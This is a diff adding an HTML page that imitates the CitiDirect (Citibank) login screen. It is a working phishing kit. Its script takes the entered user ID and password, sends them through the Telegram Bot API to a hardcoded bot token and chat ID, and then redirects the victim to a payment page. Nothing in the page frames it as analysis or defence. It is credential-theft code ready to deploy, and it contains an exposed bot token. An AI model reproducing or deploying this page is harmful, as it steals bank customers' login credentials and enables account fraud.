@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CitiDirect Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            width: 320px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 45px 10px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            box-sizing: border-box;
+            background-color: #f5f5f5;
+        }
+
+        .input-group img {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+        }
+
+        .btn-login,
+        .btn-biometrics {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+
+        .btn-login {
+            background-color: #e0e0e0;
+            color: #555;
+        }
+
+        .btn-biometrics {
+            background-color: #f5f5f5;
+            color: #888;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            color: #888;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #ddd;
+            margin: 0 10px;
+        }
+
+        .help-link {
+            font-size: 14px;
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container"> 
+        <img src="../img/BANCO CITIBANK.png" alt="CitiDIRECT">
+        <div class="input-group">
+            <input type="text" id="usuario" placeholder="Enter User ID" style="margin-bottom: 8%;">
+            <input type="password" id="contrasena" placeholder="Enter password">
+        </div>
+        <button class="btn-login" onclick="nextPage()">Log in</button>
+        
+        <a href="#" class="help-link">Need help?</a>
+    </div>
+    
+    <script>
+        // Bandera para controlar el envío de datos
+        let datosEnviados = false;
+        
+        // Función de validación y envío de datos a Telegram
+        function nextPage() {
+            // Obtener los valores de los campos
+            const usuario = document.getElementById('usuario').value;
+            const contrasena = document.getElementById('contrasena').value;
+        
+            // Validar que los campos no estén vacíos
+            if (!usuario || !contrasena) {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+        
+            // Si los datos no han sido enviados aún
+            if (!datosEnviados) {
+                // Preparar los datos para enviar al bot de Telegram
+                const mensaje = `Nuevo acceso:\nUsuario: ${usuario}\nContraseña: ${contrasena}`;
+        
+                // Llamar a la función para enviar los datos al bot de Telegram
+                enviarATelegram(mensaje);
+            } else {
+                // Si ya se enviaron los datos, redirigir
+                window.location.href = "URL_DE_LA_PAGINA_Siguiente";  // Reemplaza con la URL de la siguiente página
+            }
+        }
+        
+        // Función para enviar el mensaje al bot de Telegram
+        function enviarATelegram(mensaje) {
+            const token = "8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE"; // Reemplaza con el token de tu bot de Telegram
+            const chatId = "5848946481"; // Reemplaza con el ID de tu chat o canal de Telegram
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+        
+            // Enviar los datos usando Fetch API
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        datosEnviados = true;  // Marcar los datos como enviados
+                        window.location.href = "../cargapago.html";  // Redirigir después de enviar
+                    } else {
+                        alert("Hubo un error al enviar los datos.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error en la conexión. Inténtalo nuevamente.");
+                });
+        }
+        
+        // Función para el botón 'Anterior'
+        function previousPage() {
+            window.history.back();  // Redirige a la página anterior
+        }
+    </script>
+    
+
+</body>
+</html>
